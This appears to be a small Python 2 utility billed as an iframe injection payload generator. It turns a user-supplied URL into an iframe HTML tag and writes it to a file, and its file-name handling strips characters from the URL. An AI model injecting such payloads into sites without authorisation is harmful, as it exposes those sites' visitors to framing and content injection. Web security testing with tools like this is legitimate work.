from urlparse import urlparse
import sys
if len(sys.argv) == 2:
    url=sys.argv[1]
else:
    url=raw_input("please enter url:")

print "IFRAME INJECTION PAYLOAD GENERATOR"

payload='''<iframe src="%s" width=250 height=250></iframe>'''
url=urlparse(url)
url='{uri.scheme}://{uri.netloc}/'.format(uri=url)
fname=url.translate(None,"http:/")+".html"
htmlpayload=payload % (url)
f=open(fname,"w")
f.writelines(htmlpayload)
f.close()
print "\n\n\n"+htmlpayload+"\n\n\n"
print "payload generated for url "+url+" with file name "+fname
#program by jayaram yalla
#program useage programname.py url or directly launch the program and give input(url)
